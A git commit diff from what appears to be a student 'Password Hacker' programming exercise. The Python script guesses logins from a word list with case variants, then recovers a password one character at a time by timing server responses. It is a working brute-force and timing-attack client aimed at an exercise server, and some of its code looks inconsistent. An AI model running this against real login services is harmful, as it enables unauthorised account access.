d11ae740a4a6fae03c5f6a54b6ec3f3b07f2e19d
gaeta <gaetanomaranzino63@gmail.com>
2022-04-15 12:42:55 +0200

    End phase 5

--- Password Hacker/task/hacking/hack.py
+++ Password Hacker/task/hacking/hack.py
@@ -3,6 +3,7 @@ import socket
 import sys
 import json
 import string
+import time
 
 
 def receive_cmd():
@@ -16,30 +17,38 @@ def create_socket(HOST, PORT):
         s.connect((HOST, PORT))
         login = check_log(s)
         check_pwd(s, login)
+        s.close()
 
 
 def check_pwd(s, login):
+
     all_chars = set(string.ascii_lowercase+string.ascii_uppercase+string.digits)
     pwd = ""
-    un_success = True
-    while un_success:
+    success = True
+    while success:
         for ch in all_chars:
+            start = time.time()
             req = {"login": login, "password": pwd + ch}
             request = json.dumps(req)
             enc_req = request.encode()
             s.send(enc_req)
             response = s.recv(1024)
             response = response.decode("UTF-8")
-            if response["result"] == "Exception happened during login":
-                pwd += ch
-                break
-            if response["result"] == "Connection success!":
-                print(f'{"login": {login}, "password": {pwd + ch}}')
-                un_success = False
+            end = time.time()
+            if "Wrong password!" in response:
+                total = end - start
+                if total > 0.1:
+                    pwd += ch
+                    break
+
+            if "Connection success!" in response:
+                print(request)
+                success = False
                 break
 
 
 def check_log(s):
+
     path = "C:\\Users\\gaeta\\PycharmProjects\\Password Hacker\\Password Hacker\\task\\hacking\\"
     with open(path + "logins.txt", "r", encoding="UTF-8") as f:
         logins = f.readlines()
@@ -49,14 +58,14 @@ def check_log(s):
             for var_log in map(lambda x: ''.join(x),
                                  itertools.product(*([letter.lower(), letter.upper()] for letter in login))):
                 req = {"login": var_log, "password": pwd}
-                request = json.dumps(req)
-                enc_request = request.encode()
-                s.send(enc_request)
+                request = json.dumps(req).encode()
+                s.send(request)
                 response = s.recv(1024)
                 response = response.decode("UTF-8")
+                response = json.loads(response)
                 if response["result"] == "Wrong password!":
                     return login
-                else:
+                if response["result"] == "Wrong login!":
                     break
 
 
